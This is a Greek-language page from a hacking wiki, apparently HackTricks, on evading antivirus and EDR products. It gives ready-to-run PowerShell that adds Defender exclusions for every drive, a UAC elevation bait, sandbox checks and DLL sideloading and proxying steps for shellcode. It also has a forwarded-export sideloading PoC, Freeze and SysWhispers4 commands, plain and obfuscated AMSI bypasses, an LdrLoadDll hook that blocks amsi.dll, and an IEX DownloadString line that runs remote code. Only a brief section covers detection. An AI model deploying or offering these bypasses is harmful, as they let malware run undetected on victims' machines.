# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από τον** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για τη διακοπή λειτουργίας του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για τη διακοπή λειτουργίας του Windows Defender, προσποιούμενο ότι υπάρχει άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait πριν από την παραποίηση του Defender

Οι public loaders που μεταμφιέζονται ως game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers, οι οποίοι πρώτα **ζητούν από τον χρήστη elevation** και μόνο έπειτα εξουδετερώνουν το Defender. Η ροή είναι απλή:

1. Ελέγχει αν υπάρχει administrative context με το `net session`. Η εντολή πετυχαίνει μόνο όταν ο caller έχει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως standard user.
2. Κάνει αμέσως relaunch του εαυτού του με το verb `RunAs`, ώστε να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας παράλληλα την αρχική command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν “cracked” λογισμικό, επομένως συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Blanket `MpPreference` exclusions για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει elevated δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιούν εξ ολοκλήρου την υπηρεσία. Ο loader αρχικά τερματίζει τον GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες exclusions**, ώστε κάθε user profile, system directory και removable disk να μην μπορεί να σαρωθεί:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε mounted filesystem (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προληπτικός — οι attackers διατηρούν την επιλογή να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να αγγίξουν ξανά το Defender.
- Όλες οι αλλαγές καταλήγουν στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε μεταγενέστερα στάδια να επιβεβαιώσουν ότι τα exclusions παραμένουν ή να τα επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή καμία υπηρεσία του Defender δεν διακόπτεται, οι naïve health checks συνεχίζουν να αναφέρουν «antivirus active», παρόλο που η real-time επιθεώρηση δεν αγγίζει ποτέ αυτά τα paths.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Επί του παρόντος, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα file είναι malicious ή όχι: static detection, dynamic analysis και, για τα πιο advanced EDRs, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται με την επισήμανση γνωστών malicious strings ή arrays από bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το file (π.χ. file description, company name, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σας εντοπίσει ευκολότερα, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως malicious. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτό το είδος detection:

- **Encryption**

Αν κάνετε encrypt το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το κάνει decrypt και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε ορισμένα strings στο binary ή το script σας ώστε να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας tools, δεν θα υπάρχουν γνωστές bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε το static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το file σε πολλά segments και στη συνέχεια ζητά από το Defender να σκανάρει το καθένα ξεχωριστά. Έτσι μπορεί να σας δείξει ακριβώς ποια strings ή bytes έχουν επισημανθεί στο binary σας.

Συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το practical AV Evasion.

### **Dynamic analysis**

Το Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για malicious activity (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των passwords του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά ακολουθούν ορισμένα πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Sleep before execution** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AVs έχουν πολύ λίγο χρόνο για να σκανάρουν files, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, επομένως τα μεγάλα sleeps μπορούν να παρεμποδίσουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν το sleep, ανάλογα με τον τρόπο υλοποίησής του.
- **Checking machine's resources** Συνήθως τα Sandboxes διαθέτουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το machine του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία του CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου το workstation είναι joined στο domain "contoso.local", μπορείτε να ελέγξετε το domain του computer για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει. Αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμα να τερματίσει.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το computer name στο malware σας πριν από το detonation. Αν το όνομα ταιριάζει με το HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο defender's sandbox, οπότε μπορείτε να κάνετε το πρόγραμμά σας να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικά ακόμη πολύ καλά tips από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως αναφέραμε νωρίτερα σε αυτό το post, τα **public tools** τελικά **θα εντοπιστούν**, επομένως θα πρέπει να αναρωτηθείτε κάτι:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεστε πραγματικά το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανότατα ένα από τα — αν όχι το — πιο επισημασμένα malware από τα AVs και τα EDRs. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χειριστείτε ώστε να παρακάμψετε τα AVs. Επομένως, απλώς αναζητήστε alternatives για αυτό που προσπαθείτε να επιτύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε το automatic sample submission** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας εντοπίζεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε το automatic sample submission και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **δίνετε πάντα προτεραιότητα στη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, επομένως είναι ένα πολύ απλό trick για την αποφυγή του detection σε ορισμένες περιπτώσεις (αν το payload σας μπορεί φυσικά να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση του antiscan.me μεταξύ ενός κανονικού Havoc EXE payload και ενός κανονικού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά tricks που μπορείτε να χρησιμοποιήσετε με DLL files ώστε να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την victim application και τα malicious payload(s) δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα DLL Hijackable/Sideloadable**, καθώς αυτή η τεχνική είναι αρκετά stealthy όταν υλοποιείται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να εντοπιστείτε εύκολα.

Απλώς τοποθετώντας ένα malicious DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, καθώς το πρόγραμμα περιμένει να υπάρχουν συγκεκριμένες functions μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και malicious) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα template πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το αποκαλούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσεις το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το video του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθεις περισσότερα σχετικά με όσα συζητήσαμε, σε μεγαλύτερο βάθος.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να κάνουν export συναρτήσεων που στην πραγματικότητα είναι "forwarders": αντί να δείχνει σε κώδικα, το export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, ο Windows loader:

- Κάνει Load το `TargetDll` αν δεν έχει ήδη φορτωθεί
- Κάνει Resolve το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσεις:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, η οποία περιλαμβάνει τον κατάλογο του module που εκτελεί το forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: εντόπισε ένα signed DLL που κάνει export μια συνάρτηση forwarded σε ένα non-KnownDLL module name και, στη συνέχεια, τοποθέτησε αυτό το signed DLL μαζί με ένα attacker-controlled DLL που έχει ακριβώς το ίδιο όνομα με το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σου από τον ίδιο κατάλογο, εκτελώντας το DllMain σου.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded συνάρτηση για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε το forward με ένα signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για hunting:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για αναζήτηση υποψηφίων: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για detection/defense:
- Παρακολουθήστε LOLBins (π.χ. `rundll32.exe`) που φορτώνουν signed DLLs από non-system paths και, στη συνέχεια, φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Δημιουργήστε alert για αλυσίδες διεργασιών/modules όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε user-writable paths
- Εφαρμόστε code integrity policies (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα payload toolkit για την παράκαμψη EDRs με χρήση suspended processes, direct syscalls και alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού· ό,τι λειτουργεί σήμερα μπορεί να ανιχνεύεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο tool. Αν είναι δυνατόν, δοκιμάστε να συνδυάζετε πολλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και πραγματοποιούν μετάβαση σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές invocation:**
- **Direct (embedded)**: εισάγει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς να γίνεται hit σε export του `ntdll`).
- **Indirect**: πραγματοποιεί jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε call.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής opcode sequence `0F 05` στον δίσκο· εντοπίζει μια syscall sequence κατά το runtime.

**Hook-resistant στρατηγικές SSN resolution:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSNs ταξινομώντας τα syscall stubs με βάση τη virtual address, αντί να διαβάζει τα stub bytes.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSNs από το `.text` και στη συνέχεια κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει SSN inference με ταξινόμηση VA και opcode validation όταν ένα stub είναι καθαρό· αν είναι hooked, κάνει fallback σε VA inference.
- **HW Breakpoint**: θέτει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς parsing hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για την αποτροπή του "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, επομένως, αν μπορούσατε με κάποιον τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η δυνατότητα AMSI είναι ενσωματωμένη στα παρακάτω components των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων EXE, COM, MSI ή εγκατάσταση ActiveX)
- PowerShell (scripts, interactive χρήση και dynamic code evaluation)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις antivirus λύσεις να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας τα περιεχόμενα των scripts σε μορφή που είναι τόσο unencrypted όσο και unobfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την παρακάτω alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει στην αρχή το `amsi:` και στη συνέχεια το path προς το executable από το οποίο εκτελέστηκε το script, σε αυτήν την περίπτωση το powershell.exe

Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά και πάλι εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, ξεκινώντας από το **.NET 4.8**, ο κώδικας C# περνά επίσης μέσω του AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για τη φόρτωση in-memory execution. Για αυτόν τον λόγο, συνιστάται η χρήση παλαιότερων versions του .NET (όπως 4.7.2 ή παλαιότερες) για in-memory execution, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Καθώς το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής του detection.

Ωστόσο, το AMSI έχει τη δυνατότητα να κάνει unobfuscate scripts ακόμη και αν διαθέτουν πολλαπλά layers, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο υλοποίησής του. Αυτό καθιστά την αποφυγή του όχι και τόσο straightforward. Παρόλο που, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξετε μερικά variable names και θα είστε εντάξει, επομένως εξαρτάται από το πόσο έχει γίνει flag κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται μέσω φόρτωσης ενός DLL στη διαδικασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι δυνατό να γίνει εύκολα tamper με αυτό, ακόμη και όταν εκτελείται ως unprivileged user. Λόγω αυτού του flaw στην υλοποίηση του AMSI, οι researchers έχουν βρει πολλαπλούς τρόπους για να παρακάμπτουν το AMSI scanning.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία του AMSI initialization (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά κανένα scan για την τρέχουσα διαδικασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει την ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη χρήσιμο για την τρέχουσα διεργασία powershell. Αυτή η γραμμή, φυσικά, έχει επισημανθεί από το ίδιο το AMSI, επομένως απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Έχετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτό το post, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν το σχέδιό σας είναι να παραμείνετε undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων που παρέχει ο χρήστης) και την αντικατάστασή της με instructions που επιστρέφουν τον κωδικό για το E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα του πραγματικού scan επιστρέφει 0, το οποίο ερμηνεύεται ως clean result.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για το bypass του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Ένα robust, language‑agnostic bypass είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται scans για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders εξίσου (σε οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με την τροφοδότηση scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφεύγετε μεγάλα command-line artefacts.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. το `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για bypass του AMSI.
